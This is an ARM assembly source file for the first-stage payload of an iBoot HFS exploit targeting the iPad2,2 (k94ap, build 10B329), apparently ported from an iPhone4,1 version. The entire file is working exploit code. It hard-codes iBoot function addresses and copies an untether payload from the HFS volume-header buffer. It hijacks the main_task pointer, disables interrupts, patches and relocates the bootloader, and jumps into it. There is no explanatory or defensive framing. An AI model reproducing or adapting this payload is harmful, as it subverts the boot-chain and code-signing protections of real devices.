@ iboot_p1.s for iPad2,2 (k94ap) 10B329 / iBoot-1537.9.55
@ Ported from iPhone4,1 10B329 iboot_p1.s
@ The HFS exploit runs this code from the extents buffer, so every call
@ outside the relocated blob must be absolute.

    .text
    .syntax    unified

    .arm
_entry:
    b    _entry


    .org    0x20B28
    .thumb
    .thumb_func
_get_current_task:
    bx    lr


    .org    0x21e68
    .thumb_func
_arch_cpu_quiesce:
    bx    lr


    .org    0x364D0
    .arm
_memcpy:
    bx    lr


    .org    0x36E6C
    .thumb
    .thumb_func
_disable_interrupts:
    bx    lr


    .org    0x458F0
    .thumb
    .thumb_func
_iboot_patch:
    ldr    r0, 1f                   @ dst (payload in the copy)
    ldr    r1, 2f                   @ src (untether in volume-header buffer)
    movs   r2, #0x44                @ payload_sz
    ldr    r3, 5f                   @ _memcpy must be absolute: this blob runs
    blx    r3                       @ at 0x9ff49e90, not at its link address

    movw   r0, #0xc18               @ main_task() ptr
    ldr    r1, 3f                   @ payload_base
    str    r1, [r4, r0]

    ldr    pc, 4f                   @ _memcpy clobbers LR; continue at _next

    .align 2
1:  .word  0x84045100
2:  .word  0x9ff49ec4
3:  .word  0x9ff45101
4:  .word  0x9ff4a16c + (_next - _payload)  @ runtime _next
5:  .word  0x9ff364d0               @ _memcpy (ARM)


    .org    0x45BCC
    .global _payload
    .thumb
    .thumb_func
_payload:
    ldr.w  sp, =0x9ff508a0          @ safe HFS stack for k94ap
    b.w    _payload_main            @ real body is in the second fragment
    .space 0x16, 0                  @ first fragment is 0x1E bytes


    .org    0x45BEA
_payload_main:
    ldr    r3, =0x9ff36e6d          @ _disable_interrupts (Thumb)
    blx    r3

    ldr    r0, =0x9ff4a06d          @ nettoyeur (patches original iBoot)
    blx    r0

    mov.w  r4, #0x84000000

    mov    r0, r4                   @ dst
    ldr    r1, =0x9ff00000          @ src
    ldr    r2, =0x47000             @ size
    ldr    r3, =0x9ff364d0          @ _memcpy (ARM)
    blx    r3

    @ inline iboot patch (header-buffer code is XN on k94ap)
    ldr    r0, =0x84045100
    ldr    r1, =0x9ff49ec4
    movs   r2, #0x44
    ldr    r3, =0x9ff364d0
    blx    r3

    movw   r0, #0xc18
    ldr    r1, =0x9ff45101
    str    r1, [r4, r0]

_next:
    ldr    r0, =0x8401ae74
    ldr    r1, =0x60182000
    str    r1, [r0]

    ldr    r3, =0x9ff016c9
    blx    r3

    ldr    r3, =0x9ff21e69
    blx    r3

    bx     r4

    .align 2
